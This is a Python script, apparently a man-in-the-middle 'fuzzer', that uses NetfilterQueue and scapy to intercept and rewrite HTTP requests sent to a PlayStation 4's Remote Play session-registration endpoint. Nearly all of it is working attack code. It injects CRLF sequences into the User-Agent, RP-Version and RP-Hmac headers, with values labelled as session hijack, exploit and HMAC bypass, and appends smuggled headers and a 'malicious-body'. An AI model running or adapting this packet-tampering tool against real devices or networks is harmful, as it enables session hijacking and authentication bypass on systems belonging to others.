from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import re

# Configuration
PS4_IP = "192.168.1.xx"
CLIENT_IP = "192.168.1.xx"
PORT = 9295
TARGET_ENDPOINT = b"POST /sie/ps4/rp/sess/rgst HTTP/1.1"

REQUEST_OPERATIONS = {
    TARGET_ENDPOINT: {
        # === CRLF INJECTION ===
        'modify': {
            b"User-Agent: ": b"User-Agent: remoteplay Windows\r\nX-Injected: session_hijack",
            b"RP-Version: ": b"RP-Version: 10.0\r\nX-Exploit: true",
            b"RP-Hmac: ": b"RP-Hmac: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\r\nX-Bypass: 1"
        },
        'add': [
            b"X-Attack: start\r\nInjected-Command: systeminfo",
            b"X-CRLF-Injection: hello\r\n\r\nmalicious-body\r\n\r\n"
        ]
    }
}

def modify_http(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
        raw = scapy_pkt[Raw].load
        
        # Only process our target endpoint
        if TARGET_ENDPOINT in raw:
            modified_raw = raw
            modified = False
            
            # Modify existing headers
            for search, replace in REQUEST_OPERATIONS[TARGET_ENDPOINT]['modify'].items():
                if search in modified_raw:
                    pattern = re.compile(re.escape(search) + b'.*')
                    modified_raw = pattern.sub(replace, modified_raw)
                    modified = True
            
            # Add new headers
            header_end = modified_raw.find(b"\r\n\r\n")
            if header_end != -1:
                new_headers = b"".join(REQUEST_OPERATIONS[TARGET_ENDPOINT]['add'])
                modified_raw = modified_raw[:header_end] + new_headers + modified_raw[header_end:]
                modified = True
            
            if modified:
                print(f"🔥 Fuzzing {TARGET_ENDPOINT.decode()}")
                scapy_pkt[Raw].load = modified_raw
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[TCP].chksum
                pkt.set_payload(bytes(scapy_pkt))
    
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify_http)

try:
    print(f"🎯 Targeting only: {TARGET_ENDPOINT.decode()}")
    print("🚀 Fuzzer active - Waiting for target packets...")
    nfqueue.run()
except KeyboardInterrupt:
    print("🛑 Stopping fuzzer...")
    nfqueue.unbind()
